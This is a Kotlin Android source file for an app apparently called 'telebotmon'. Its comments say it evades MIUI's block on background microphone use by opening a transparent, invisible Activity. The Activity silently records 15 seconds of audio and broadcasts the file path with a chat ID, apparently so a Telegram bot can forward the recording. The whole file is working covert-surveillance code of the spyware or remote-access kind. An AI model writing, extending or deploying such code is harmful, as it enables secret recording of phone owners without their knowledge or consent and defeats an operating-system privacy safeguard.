package com.hpu.telebotmon

import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Bundle
import android.util.Log

/**
 * Activity "pengganti" untuk rekaman audio di MIUI.
 * MIUI memblokir mic access dari background service, tapi mengizinkan
 * dari app yang punya Activity di foreground. Activity ini non-visible
 * (translucent, tidak blocking) — cukup untuk mengaktifkan mic.
 */
class AudioRecorderActivity : Activity() {

    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var focusGranted = false
    private var am: AudioManager? = null

    companion object {
        const val TAG = "AudioRecorderAct"
        const val ACTION_DONE = "com.hpu.telebotmon.ACTION_RECORD_DONE"
        const val ACTION_FAIL = "com.hpu.telebotmon.ACTION_RECORD_FAIL"
        const val EXTRA_FILE = "file_path"
        const val EXTRA_ERROR = "error"
        const val EXTRA_DURATION_MS = "duration_ms"
        const val EXTRA_CHAT_ID = "chat_id"
    }

    private var chatId = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        chatId = intent?.getStringExtra(EXTRA_CHAT_ID) ?: ""
        // Tampilan transparan, tidak blocking UI
        window?.setBackgroundDrawable(android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT))
        am = getSystemService(AUDIO_SERVICE) as AudioManager
        startRecording()
    }

    private fun startRecording() {
        if (isRecording) return
        isRecording = true
        val ts = System.currentTimeMillis()
        val outFile = java.io.File(getExternalFilesDir(null) ?: filesDir, "rec_${ts}.m4a")
        if (outFile.exists()) outFile.delete()
        Log.d(TAG, "recording to ${outFile.absolutePath}")

        try {
            // 1. Audio focus
            focusGranted = requestAudioFocus()
            Log.d(TAG, "audioFocus=$focusGranted")

            // 2. MediaRecorder with retry
            var started = false
            for (source in listOf(MediaRecorder.AudioSource.VOICE_RECOGNITION, MediaRecorder.AudioSource.MIC)) {
                val rec = if (Build.VERSION.SDK_INT >= 31) {
                    MediaRecorder(applicationContext)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }
                mediaRecorder = rec
                try {
                    rec.setAudioSource(source)
                    rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    rec.setAudioSamplingRate(44100)
                    rec.setAudioEncodingBitRate(96000)
                    rec.setOutputFile(outFile.absolutePath)
                    rec.prepare()
                    rec.start()
                    started = true
                    Log.d(TAG, "MediaRecorder started with source=$source")
                    break
                } catch (e: Exception) {
                    Log.w(TAG, "source=$source failed: ${e.message}")
                    try { rec.release() } catch (_: Exception) {}
                }
            }
            mediaRecorder = if (started) mediaRecorder else null

            if (!started) {
                Log.e(TAG, "All audio sources failed")
                releaseRecorder()
                broadcastFail("Semua audio source gagal. MIUI memblokir mic.")
                finish()
                return
            }

            // 3. Tunggu 15 detik (Handler, bukan delay di main thread)
            android.os.Handler(mainLooper).postDelayed({
                stopAndSend(outFile)
            }, 15_000L)
        } catch (e: Exception) {
            Log.e(TAG, "startRecording exception: ${e.message}")
            releaseRecorder()
            broadcastFail(e.message ?: "unknown")
            finish()
        }
    }

    private fun requestAudioFocus(): Boolean {
        val am = am ?: return false
        return try {
            if (Build.VERSION.SDK_INT >= 26) {
                val focusReq = android.media.AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN)
                    .setAudioAttributes(
                        AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_MEDIA)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                            .build()
                    )
                    .build()
                am.requestAudioFocus(focusReq) == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
            } else {
                @Suppress("DEPRECATION")
                val result = am.requestAudioFocus(null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN)
                result == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
            }
        } catch (e: Exception) {
            Log.w(TAG, "requestAudioFocus fail: ${e.message}")
            false
        }
    }

    private fun stopAndSend(outFile: java.io.File) {
        try {
            mediaRecorder?.stop()
        } catch (e: Exception) {
            Log.w(TAG, "stop: ${e.message}")
        }
        releaseRecorder()

        if (focusGranted) {
            try { am?.abandonAudioFocus(null) } catch (_: Exception) {}
        }

        if (outFile.exists() && outFile.length() > 0) {
            Log.d(TAG, "recording complete, ${outFile.length()} bytes")
            sendBroadcast(Intent(ACTION_DONE).apply {
                putExtra(EXTRA_FILE, outFile.absolutePath)
                putExtra(EXTRA_DURATION_MS, 15_000L)
                putExtra(EXTRA_CHAT_ID, chatId)
            })
        } else {
            Log.w(TAG, "file is empty (0 bytes)")
            broadcastFail("File rekaman kosong.")
        }
        finish()
    }

    private fun releaseRecorder() {
        try { mediaRecorder?.release() } catch (_: Exception) {}
        mediaRecorder = null
        isRecording = false
    }

    private fun broadcastFail(msg: String) {
        sendBroadcast(Intent(ACTION_FAIL).apply {
            putExtra(EXTRA_ERROR, msg)
            putExtra(EXTRA_CHAT_ID, chatId)
        })
    }

    override fun onDestroy() {
        releaseRecorder()
        super.onDestroy()
    }
}
